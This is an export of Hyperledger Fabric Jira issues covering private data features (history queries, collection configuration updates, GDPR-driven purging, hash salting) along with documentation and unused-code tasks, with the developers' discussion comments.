Summary,Issue key,Issue id,Parent id,Issue Type,Status,Project key,Project name,Project type,Project lead,Project description,Project url,Priority,Resolution,Assignee,Reporter,Creator,Created,Updated,Last Viewed,Resolved,Affects Version/s,Affects Version/s,Affects Version/s,Fix Version/s,Fix Version/s,Component/s,Component/s,Component/s,Component/s,Component/s,Due Date,Votes,Labels,Labels,Labels,Labels,Labels,Labels,Description,Environment,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Log Work,Log Work,Original Estimate,Remaining Estimate,Time Spent,Work Ratio,Σ Original Estimate,Σ Remaining Estimate,Σ Time Spent,Security Level,Inward issue link (Blocks),Inward issue link (Blocks),Inward issue link (Blocks),Inward issue link (Blocks),Inward issue link (Blocks),Inward issue link (Blocks),Inward issue link (Blocks),Outward issue link (Blocks),Outward issue link (Blocks),Outward issue link (Blocks),Outward issue link (Blocks),Outward issue link (Blocks),Outward issue link (Blocks),Outward issue link (Blocks),Inward issue link (Cloners),Inward issue link (Cloners),Inward issue link (Cloners),Outward issue link (Cloners),Inward issue link (Duplicate),Inward issue link (Duplicate),Inward issue link (Duplicate),Outward issue link (Duplicate),Outward issue link (Duplicate),Inward issue link (Relates),Inward issue link (Relates),Inward issue link (Relates),Inward issue link (Relates),Outward issue link (Relates),Outward issue link (Relates),Outward issue link (Relates),Outward issue link (Relates),Outward issue link (Relates),Outward issue link (Relates),Outward issue link (Relates),Outward issue link (Relates),Outward issue link (Relates),Outward issue link (Relates),Outward issue link (Relates),Outward issue link (Relates),Attachment,Attachment,Attachment,Attachment,Attachment,Attachment,Attachment,Attachment,Attachment,Attachment,Attachment,Attachment,Custom field (Business Value),Custom field (Commit Levels),Custom field (Current Status),Custom field (Design),Custom field (Design Status),Custom field (Documentation Impact),Custom field (Documentation Status),Custom field (Epic Color),Custom field (Epic Link),Custom field (Epic Name),Custom field (Epic Status),Custom field (Executed),Custom field (Found in Commit),Custom field (Function Test Status),Custom field (Must Fix),Custom field (Original story points),Custom field (Parent Link),Custom field (Rank),Custom field (Release Note),Custom field (Release Note Required),Custom field (Root Cause Analysis),Custom field (SDK Impact),Custom field (Sample/Tutorial),Sprint,Sprint,Sprint,Sprint,Custom field (Steps to Reproduce),Custom field (Story Points),Custom field (System Test Impact),Custom field (Target end),Custom field (Target start),Custom field (Team),Custom field (Team),Custom field (Test Plan),Custom field (Test Result),Custom field (Test Result Details),Custom field (Test Type),Custom field (Triaged),Custom field (Usage),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Workaround),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitCommitsReferenced),Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment
"Query history of private data - by key, block, or transaction id",FAB-5094,18802,,Story,To Do,FAB,Fabric,software,denyeart,,,Medium,,,denyeart,denyeart,29/Jun/17 9:20 PM,20/Jan/21 3:10 AM,28/Oct/23 3:00 AM,,,,,Future,,fabric-ledger,,,,,,6,,,,,,,"Add a history index and chaincode API similar to public data history to enable the query of history of a private data key.

Additionally, add an API to get private data write sets for a certain block number or transaction id, similar to how you can get public data for a certain block number or transaction id.

For users that need history of private data, until this is implemented, in the interim in the chaincode you could take a hash of the private data and save it with a regular PutState(). Then you could do GetHistoryForKey() on that hashed key to find all the historical transactions for the private data key.

 ",,baohua,davidkhala,denyeart,ever-upwards,jathin.sreenivas,jgdomine,joaquimpedrooliveira,Pancham,Paradox-AT,ymlbright,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-4981,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,FAB-5108,,,,,,,,,"1|hzwqrk:5iwr4rb0zyw5",,,,Unset,,,,,,,,Unset,,,,,,,,,,,baohua,davidkhala,denyeart,ever-upwards,jathin.sreenivas,jgdomine,joaquimpedrooliveira,Pancham,Paradox-AT,ymlbright,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"09/Jan/19 11:44 AM;davidkhala;is there more detailed work flow provided?;;;","13/Aug/20 1:02 AM;Paradox-AT;Guys any updates or workarounds??;;;","17/Aug/20 10:00 PM;denyeart;[~Paradox-AT] Workaround is mentioned in the last paragraph of Description.;;;","09/Oct/20 10:51 AM;Pancham;[~denyeart] I will like to work on this issue. Can you please give me some pointers to get started? Thanks;;;","20/Jan/21 3:10 AM;jathin.sreenivas;I am trying the above-mentioned approach for getting the history. But I am not sure what is the key I am supposed to store in the state database as the hash value? For example, should it be the asset ID? And also if suppose I retrieve the history from a private collection, will it be the actual data or the hashed data? Can you let me know the function to hash the key?;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Ledger support for private data using goleveldb (simulation/validation/commit),FAB-5095,18803,18787,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,denyeart,denyeart,29/Jun/17 9:22 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,26/Aug/17 12:11 AM,,,,,,,,,,,,0,,,,,,,,,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy6bb:",,,,,,,,,,,,,,,,,,,,,,,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Support changes to private data collection configuration such as organization mapping,FAB-5096,18804,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,manish-sethi,denyeart,denyeart,29/Jun/17 9:23 PM,07/Dec/18 11:50 AM,28/Oct/23 3:00 AM,16/May/18 5:06 AM,,,,v1.2.0,,fabric-gossip,fabric-ledger,,,,,1,,,,,,,design doc - [https://docs.google.com/document/d/1ORt3HFE13gnq204lXNp6i1BpMLMm-RAKVts8cH50kK4/edit?usp=sharing],,denyeart,jufeng.yao,manish-sethi,ScottAllan,Senthil1,troyronda,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-7643,,,,,,,,,FAB-5093,FAB-5092,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,FAB-8718,,,,,,,,,"1|hzwswn:",,,,Unset,,May2018 - NextGen Endorsement,,,,,,Unset,,,,,,,,,,,denyeart,jufeng.yao,manish-sethi,ScottAllan,Senthil1,troyronda,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"10/Jan/18 10:41 AM;troyronda;[~denyeart] The ability to update collection configuration is very important, since organizations can come and go and purge policies need updates over time.

I'd label the priority of this item very high in the context of the SideDB feature.;;;","30/Jan/18 2:56 AM;troyronda;Capabilities for organizations to join and leave are needed along with considerations for existing data access.
 * Support for implementing _new policies on an existing collection_. Over time, organizations can join and leave. In particular:
 ** New organizations will need to transact against existing collections.
 ** In some private data collections, new organizations will need to transact/access against data covered by one or more previous policies. In some other private data collections, new organizations do not access existing data and wouldn’t be granted access to data covered under previous policies.
 ** Removed organizations should not receive new data.
 ** Need the ability to implement new collection policy for other parameters – particularly evolving purge policies (FAB-5092).
 * Ability for _a joining organization to retrieve a copy of existing collection data_. In cases where an organization is granted access to data covered by one or more policies, they should have the ability to replicate the existing data to their peers from other (willing) organization(s)’ peers, as a capability of Fabric. Related: FAB-5093;;;","16/Mar/18 5:30 AM;manish-sethi;Initial design doc - https://docs.google.com/document/d/1ORt3HFE13gnq204lXNp6i1BpMLMm-RAKVts8cH50kK4/edit?usp=sharing;;;","29/May/18 2:41 PM;jufeng.yao;one question for peer's knowledge of private data (or collection) : from design doc, there are 2 assumptions 
1, Private data is accessible to {color:red}all peers on the channel{color} (assumption for core solution in Section 2, assumption is revised in Section 3 to allow partitioning of private data).
2, When storage partitions are defined, private data is not persistently known to all peers on the channel, but rather a subset of peers. The private data is, {color:red}however, temporarily known across the channel (revised from Section 1, assumption 2){color}.

what I'm not sure is that : does these mean that {color:red}Unauthorized peers{color} can also persistently (from #1) or temporarily (from #2) access the private data? 

for example, 3 orgs : org0 (org0-peer0 & org0-peer1), org1 (org1-peer0 & org1-peer1), org2 (org2-peer0 & org2-peer1), while peers from org2 aren't allowed to access private data. 

for #1, peers from org2 can still get private data for txes by gossip in endorsement? (since design doc says : ESCC will make sure at least K other peers for redundancy, The K other peers will also store the private read write set in their temp DB and continue gossipping to {color:red}make the data available across the peers in the network. {color})
for #2, peers from org2 can temporarily get keys & values for range query validation? (since range query must apply against to private data)

if I'm correct, seems private data can't completely keep secret from unauthorized peers, right?

thanks  ;;;","30/May/18 11:01 PM;manish-sethi;[~jufeng.yao] - No, only authorized Orgs get the private data. In your example above org2 won;t get the private data.

In your scenario #1, K other peers are subset of the authorized members and  hence the K should be less than the size of the member-set for a collection. Similarly, in your scenario #2, a range query on the private data on org2 is meaningless and client should not send the query to org2 in this example.;;;","31/May/18 10:31 AM;jufeng.yao;[~manish-sethi], thanks very much for explains. 

{color:red}client should not send the query to org2 in this example{color}
do you mean hashed RW set returned doesn't contain range query read set at all ?  since it is meaningless for unauthorized org2, and range query read set already saved in temp db, right?

thanks very much;;;","31/May/18 11:39 AM;manish-sethi;[~jufeng.yao] yes.

In addition, before returning any query results on a private data for a single key, the peer performs a check whether it has the pvt data corresponding to the hashes present in the public space. In your example, the org2 does not have any pvt data, hence any point query on org2 will result in an error.;;;","31/May/18 3:52 PM;jufeng.yao;[~manish-sethi], thanks very much. 
after I checked your answers several times, seems we are talking about different things of range query ^^. what I asked is this:
 client send proposal to endorsers (org1.peer1, org2.peer0) which will access private data, we pick response from org1.peer1 as an example, suppose it will include hashed RW set, focus on hashed read set, it will include hashed keys & values, but {color:red}do not include range query result{color} (right?), then client will commit tx which include hashed RW set, first to orderer, and finally to peers, include {color:red}unauthorized peers{color} (org2.peer0, org2.peer1), we pick org2.peer1 as our target, when block validation, single hashed key & value in hashed read set can be checked against to normal db, since they should already exist, while range query of private data is not included in hashed RW set, so unauthorized peers needn't verify them. 

Please check and point out any mistakes if I'm not correct, thanks very much.;;;","31/May/18 4:04 PM;manish-sethi;[~jufeng.yao] I see your doubt now. Range queries are in fact, not supported in the update transactions on pvt data for this specific reason. Because, all the peers need to decide whether the transaction is valid or not just based on the hashed read-write set.

Range queries can be used only in a read-only transactions. If you mix writes and a range query on pvt data in a transaction, you will receive an error during simulation.;;;","31/May/18 6:11 PM;jufeng.yao;[~manish-sethi] thanks very much ! that is what exactly I want !;;;","10/Aug/18 3:41 AM;troyronda;There are some remaining TODO comments related to FAB-5096 in https://github.com/hyperledger/fabric/blob/master/core/transientstore/store.go
e.g., https://github.com/hyperledger/fabric/blob/release-1.2/core/transientstore/store.go#L49;;;","10/Aug/18 4:05 AM;Senthil1;Thanks [~troyronda] for pointing this out. Will push a CR.;;;","07/Dec/18 11:50 AM;ScottAllan;When is the plan to deal with the second aspect:

 

*2) Collection BTL (Block-to-live) change*;;;",,,,,,,,,,,,,,,,,,,,,,,,,,
[GDPR support] On demand delete of private data prior to block-to-live policy based on a delete transaction,FAB-5097,18805,,Story,In Progress,FAB,Fabric,software,denyeart,,,High,,calanais,denyeart,denyeart,29/Jun/17 9:24 PM,01/Jul/21 7:55 PM,28/Oct/23 3:00 AM,,,,,v2.x,,fabric-ledger,,,,,,10,,,,,,,"Ability to delete private data from private data storage and private state database on demand by a client request, without having to wait for the typical blockToLive period prior to purging. The blockToLive mechanism is insufficient for use cases that need to be compliant with GDPR, where data must be deleted upon a subject's request.

Option for transaction resulting from DelPrivateData() chaincode API to purge key from peer's private data store and transient store on all peers, in addition to deleting from private state database on all peers.

+*Implementation notes:*+

*Private data store*

The private data store is keyed by block number and transaction index within the block and stores the private writes for a transaction. The private data write for a certain key/value can be removed from this block/tran index, leaving the store in the same state as when the private data was simply missing. We may need to add a marker to indicate that the private data was intentionally deleted and not simply missing. There is also a missing data tracking index that would need to be updated if that key was already marked as missing on the peer (that is, remove the missing entry for any newly purged keys).

To know which block/tran index to purge from private data store, we can look in the private state database. The private state database entry for the key would indicate the last block/tran index 'version' that updated the key. The private writeset can then be removed from the block/tran index in the private data store. Note that prior transactions in the private data store may have also updated the key previously, therefore we may also need a new index that tracks all historical writes for a certain key (this is already maintained for public writes to satisfy GetHistoryForKey() queries, a similar index may be needed for private writes).

*Transient store*

The transient store is keyed by txid and holds private data until the tx is committed. Therefore for committed private data, the entries should already have been removed. There is potential that the key in question is in the transient store for another uncommitted transaction. If that transaction eventually gets committed, then it would re-create the private data key. This may happen in the case of a blind write. But for the more typical read/writes, the uncommitted transaction would likely get invalidated rather than committed if seen in a future block transaction due to the deletion in the current transaction causing a MVCC invalidation. The uncommitted transactions in transient store may never be seen in a future block transaction, in which case the entry will anyways get purged automatically based on the core.yaml transientstoreMaxBlockRetention setting (default 1000 blocks).

*Private data pulling*

Other peers may attempt to pull the private data from this peer, if they are behind in block height or were missing the private data. This peer should respond to the request that the data has been intentionally purged. Currently the requesting peer will try other peers if the private data cannot be found. This logic will need to be updated to stop the retries if it is told that the private data has been intentionally purged.",,baohua,bta,calanais,chbtt,decatluther,denyeart,ever-upwards,nao,nemoto,roberttaylortech,rolivieri,ScottAllan,sheetal-hlf,toddinpal,troyronda,,,,,,,,,,,,,,,,,,,,,,,,,FAB-15536,,,,,,,,,,,,,,FAB-18461,,,,,,,,,FAB-12045,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,FAB-12038,,,,,,,,,"1|hzwqrk:5iwr4rb0zyw6",,,,Unset,,,,,,,,Unset,,,,,,,,,,,baohua,bta,calanais,chbtt,decatluther,denyeart,ever-upwards,nao,nemoto,roberttaylortech,rolivieri,ScottAllan,sheetal-hlf,toddinpal,troyronda,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"28/Jun/21 6:18 PM;calanais;FYI Picking up this item to work on, will review the designs and comments so far.;;;","01/Jul/21 7:55 PM;calanais;Current working idea is to follow the ideas in point 2 of the design document.  (https://docs.google.com/document/d/1O5UCzf8H_kN4iqMgHm8haDhqacsCBEWNY-dhDG7qgYc/edit#)
{quote}DelPrivateData is implemented as it is now; i.e., the _private write set log_ and the _private history DB_ are left intact. A new operation PurgePrivateData is implemented that immediately purges the private data from the _private state db_, the _private write set log_, (and the _private history DB_ if ever implemented_)_. This requires a new message option in the RWSet for differentiating between DelPrivateData and PurgePrivateData in the committing peer, for instance, it could be an additional is_purge[here|https://github.com/hyperledger/fabric/blob/d942308df6302d3510e835bad62f861ad854b4b3/protos/ledger/rwset/kvrwset/kv_rwset.proto#L61] or we could abuse the value_hash portion of the KVWriteHash.


{quote}
Feedback from one team interested in this function indicates that the 'purge' of the private data is a business activity, and should therefore be under the control of the chaincode function - an audit trail of purging of data being important.

An administrative action is also a possibility to clean up a peer; I'd expect (or is that a hope?) that this would be an exposing of the same underlying function. Therefore I'd propose to move forward with this approach - of an additional CC function.

 

 

 

 ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"As a peer operator, when there is missing private data, I would rather have the peer halt than commit without the missing private data",FAB-5098,18806,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,denyeart,denyeart,29/Jun/17 9:25 PM,23/Jan/20 6:52 AM,28/Oct/23 3:00 AM,23/Jan/20 6:52 AM,,,,Future,,fabric-ledger,,,,,,0,stale-item,,,,,,Add chaincode policy to halt rather than proceed with missing private data.,,denyeart,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,FAB-5108,,,,,,,,,"1|hzx08n:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,denyeart,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"23/Jan/20 6:52 AM;sykesm;Stale;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"As a chaincode client, I want to be able to perform queries in private data update transactions (even if phantoms cannot be validated)",FAB-5099,18807,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,denyeart,denyeart,29/Jun/17 9:28 PM,23/Jan/20 6:53 AM,28/Oct/23 3:00 AM,23/Jan/20 6:53 AM,,,,Future,,,,,,,,1,stale-item,,,,,,"Add chaincode policy to allow non-key queries in transactions, even if phantom validation cannot be performed due to private data not available (no access or missing).",,denyeart,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,FAB-5108,,,,,,,,,"1|hzy6bj:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,denyeart,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"23/Jan/20 6:53 AM;sykesm;Stale;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Introduction mentions Marbles and is dated vis getting started.,FAB-5100,18808,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,ChristopherFerris,ChristopherFerris,ChristopherFerris,29/Jun/17 9:31 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,02/Jul/17 1:47 AM,v1.0.0-rc1,,,v1.0.0,,fabric-docs,,,,,,0,,,,,,,The Introduction mekes reference to Marbles and there is actually a WIP page for something that we have still not received.,,ChristopherFerris,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy6br:",,,,,,,,,,,,,,,,,,,,,,,ChristopherFerris,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"29/Jun/17 9:37 PM;ChristopherFerris;https://gerrit.hyperledger.org/r/11245 FAB-5100;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add salt to private data key/value hashes,FAB-5101,18809,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,denyeart,denyeart,29/Jun/17 9:34 PM,21/Oct/19 11:57 PM,28/Oct/23 3:00 AM,21/Oct/19 11:46 PM,,,,Future,,fabric-ledger,,,,,,1,,,,,,,Adding salt to private data is required to avoid dictionary attacks.,,denyeart,grapebaba,sheetal-hlf,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-16885,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,FAB-5108,,,,,,,,,"1|hzx08v:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,denyeart,grapebaba,sheetal-hlf,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"21/Oct/19 11:46 PM;denyeart;Since introduction of private data in v1.2, solutions have been encouraged to add salt to their private data to avoid dictionary attacks. As solutions have had good results with this approach, Fabric maintainers do not intend to have Fabric automatically manage salts.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Add a FAQ section to the readthedocs, Welcome section of the Fabric wiki",FAB-5102,18810,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,luomin,JonathanLevi,JonathanLevi,29/Jun/17 9:45 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,11/Oct/17 11:03 AM,v1.0.0,,,Future,,,,,,,,0,documentation,Documentation,,,,,"Context: https://chat.hyperledger.org/channel/fabric-release?msg=qHiyDCX56g8rzhr5x

As part of the 1.0 release, one of the things that has been requested is an FAQ. I believe that we can use the following document for this purpose: [https://wiki.hyperledger.org/projects/fabric/welcome]. One thing that I see missing from this document is something that highlights the differences between v0.6 and v1.0. Is this documented somewhere that we can pull into the FAQ (even if just as a link)?",,JonathanLevi,tkuhrt,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy6bz:",,,,,,,,,,,,,,,,,,,,,,,JonathanLevi,tkuhrt,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
unused code in common packages,FAB-5103,18811,,Bug,Closed,FAB,Fabric,software,denyeart,,,Low,Done,nnao,ChristopherFerris,ChristopherFerris,29/Jun/17 9:54 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,07/Jul/17 11:09 AM,v1.0.0-rc1,,,,,fabric-peer,,,,,,0,,,,,,,"cbf$ unused github.com/hyperledger/fabric/common/...

common/config/standardvalues_test.go:47:2: field msg is unused (U1000)

common/mocks/peer/mockccstream.go:58:2: field sendOnRecv is unused (U1000)

common/tools/configtxlator/rest/router.go:24:5: var logger is unused (U1000)",,ChristopherFerris,nnao,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy6c7:",,,,,,,,,,,,,,,,,,,,,,,ChristopherFerris,nnao,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"30/Jun/17 9:23 AM;nnao;https://gerrit.hyperledger.org/r/#/c/11287/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
unused code in msp packages,FAB-5104,18812,,Bug,Closed,FAB,Fabric,software,denyeart,,,Low,Done,nnao,ChristopherFerris,ChristopherFerris,29/Jun/17 9:55 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,29/Aug/17 2:28 AM,v1.0.0-rc1,,,,,fabric-crypto,,,,,,0,,,,,,,"cbf$ unused github.com/hyperledger/fabric/msp/...

msp/cert.go:33:6: type dsaSignature is unused (U1000)

msp/cert.go:37:6: type ecdsaSignature is unused (U1000)

msp/mspimpl.go:1161:22: func (*bccspmsp).getValidityOptsForTLSCert is unused (U1000)",,ChristopherFerris,nnao,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy6cf:",,,,,,,,,,,,,,,,,,,,,,,ChristopherFerris,nnao,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"30/Jun/17 8:28 AM;nnao;https://gerrit.hyperledger.org/r/#/c/11275/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
